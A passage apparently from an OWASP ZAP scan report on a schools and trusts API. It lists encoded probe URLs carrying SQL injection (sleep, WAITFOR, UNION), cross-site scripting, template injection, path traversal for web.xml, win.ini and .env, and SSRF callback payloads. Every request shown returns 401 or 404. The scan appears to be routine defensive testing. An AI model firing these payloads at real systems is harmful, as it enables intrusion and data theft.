  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+%252F+sleep%252815%2529+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+and+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+AND+1%253D1+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+AND+1%253D2+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+or+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+OR+1%253D1+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+UNION+ALL+select+NULL+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber+where+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber0W45pz4p&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=get-help&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252F%255C980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252F980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252Fwww.google.com%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252Fwww.google.com%253A80%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=http%253A%252F%252Fwww.google.com&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=https%253A%252F%252F%255C980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=https%253A%252F%252F980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=iqzikrit0ujb9i98x9636j028f453ttyhdh9doqn6hmyq6qe5bpaeyu4&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=javascript:alert(1&29&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=rdb8az93yebnst8j0la40g3h3xdgoovyx801hsrbiccg46rom1544jg8q7&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=response.write%2528105%252C410*297%252C494%2529&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=schools&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=Set-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=thishouldnotexistandhopefullyitwillnot&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=type+%2525SYSTEMROOT%2525%255Cwin.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=VKyACeFcgxAMyddXuSNkuTvGAGaDuFUHJYjeUGPQJYPlaBjMNAThiVZfvynJjJOYaNevgXIxlbUihjBsVAmPFRiKKFjRIPYvjjkBSwECiKlECDuLOadcHKoNehQwcvhYgLrgixZTrvFafCHOfWmlwgWatcFHyDYuEgGsebepjcTybKIOgKLqnEwEWZeauCmTNTwbAyFIsxABHTxfHJJumuibnaOFCtCjoTTpNfwjWVoYNGVBbiohOebwsuVdliCYciMeqXdoeLDDrXshsWXiVVhVvhdIHtOutsgfQlyGrdOFXfmfXlZyTlsplfIBHQjmJNHUTMDOAuOJrESEZamCfZSTZYLEglryELIUckULKImjbOCNDoKKFjVfbNTuRHeiJTewaXcNbebkVuGsapPkJxEntATGaSeSGnYFNGTYhmnItpkuystJEWZbwfKumQqiSgpHRORssXThYnIsPLptoZTdhbcZcMFCeTWXPkJmSYLnHpsHKNOFAAagIDXTHHYjewqujojwRkDGMvtknddeVhZxmgnUGiUyviGmCjwgHHLMUEjitCGLENMhnIkjfXytJPWfiTIDJaKKggiBkXBfoFXOVAjiHZwAScfqbSREjbVOyAvESjlvMFsltOxBeKqfjPFmnhkUmfGPqnkIkwasTrbhimVoXdpeAdmUiXaduyyQZMerGlxWonHZIeUuZXSBGgWKqrEFZyUwWXvIuXrjVLWkPcnfTYBOwtlEmHTGxxWhwTaCWGEMxvFpAUtKNeRfIhVZaYJNTjAKrLsjLvyXsQTrCeaiDfolcXvQvalFVIjHPKbTuGrPUlHAZQYwfKalnwthmIKmasssSDPJjvNZrvUkHVnDToJpMgWGJTkfyBLMUASdZoBjwugNfQWgANoaXLSafSNYxQkSBVEYZhrbjkLGCYdToFuYTPEeuhsrdKAxFqUfBuPWpUeaaYLXLCHsDyTkrphZFDoEexBNGogoXxSiBwndFSMCEMNjDhVttIlIYNgYJTPCjmfblWDOEjKGYQjKfKZGljEHJmZyfUYXLYcurIUlPdWIkyZmlQCercDRZBogIvaRhDbDqsZuSZfNPdTVWYJyuaFUWTmCirgAXQHXoRZmTaGjXAdXjjSmhXwIwHhuaWQOvgZuJUSoalcukACUYxgisZQKsaxrVnagIOYiQfwfPpCyhfeACTdSgHbWsoFVOGbqulIhdqnooRlSmExqQkpQdqsXQaWMTDftTuVgjUhUMWuhOlLEknqkiNsFdBrNSwlVEgXHekyBSwZDLajHHyvqfWxXwHCDCrKKvGxEpNFDMRNCkPBdOYlIsokXLvWZKFPJwpVKpkIZYSKXgiYJGAiLjthDvOPxvIKkJmALIkIsWPeifRgyvVmDKiosWmwbPRlIRUdmieprKGSKXYGnCBUtgImHrGKxqfRSJuQWGslbglZeSppYOOZojRhRXOoIuLkJsvdjxWJZeXnpFtxPDsNLZDpxDRtpkTgZsPVpWSjMNTOEIJTFBqiuHRwIbDTHtUQcGPLnpmLmDxqfBOQbkeUrOSQjrsvWTxImDetrCPdBEmrMxnTUgYewmaWIRkVfxkJWfryBZwRnXqSsiyHKqJlElkhQxNEKuKQqErOfEKjoCEDEbKAjhQkFYDBFFVUuonZqNPBGwLQnLdSqyCqrtJjPbGUptvhonhoLxZfuOsNfNlnPrkQXtdBZyGHLWspjqnfYtqxFTgJySUyyTvxrifcXFZHisJqhSGiNmfcsVeXDXlhRSaEjTcqnjbnCNqjLTlrFhKJDCrwChYsltWbpwNosBSwIuenTohjZNWjVmkMJoEKFjXrvnDdndaMbYDHfqgEJpsUbYHuabbWocrRFtQuXaQUwhpeMuCGauKDLkyKKHrofScWAETJPuyHUZEFPFeLtanECFffsUAXitFWWjALbqSPfCyfRhHyBcQMJmYYEBAshrnNxXoBmBLwHWfexUVXJSYIhRaKwnaFxDAFMQvXhtQBIrlvsmwQYMUjeTCtbchDZfIbjxlloJbagIiiQDYIHtmuCvEkjgVMQKICiDUTyAmGvRqkQWrEmRZKEwGXhchYQhdDxCqWbveTtbVjQnsmU&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=WEB-INF%252Fweb.xml&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=WEB-INF%255Cweb.xml&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=www.google.com%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=www.google.com%252Fsearch%253Fq%253DZAP&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=www.google.com%253A80%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=www.google.com%253A80%252Fsearch%253Fq%253DZAP&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=www.google.com&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=ZAP&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zApPX51sS&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%2523%257B9572*5351%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%2523set%2528%2524x%253D3778*2600%2529%2524%257Bx%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%2524%257B5229*7484%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%253C%2525%253D8271*1316%2525%253Ezj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%253Cp+th%253Atext%253D%2522%2524%257B3880*5597%257D%2522%253E%253C%252Fp%253Ezj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%25238099*7534%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%25408795*2379%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%2540math+key%253D%25222435%2522+method%253D%2522multiply%2522+operand%253D%25224161%2522%252F%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%257B%253D9458*6254%257D%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%257B3222*4720%257D%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%257B35350%257Cadd%253A33310%257D%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B%257Bprint+%25227696%2522+%25229070%2522%257D%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj%257B3470*2878%257Dzj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=zj+4088*6222+zj&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/8168705801190394284
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/3862600364214824310
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/comparators%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trust%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/1527936778379857479
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
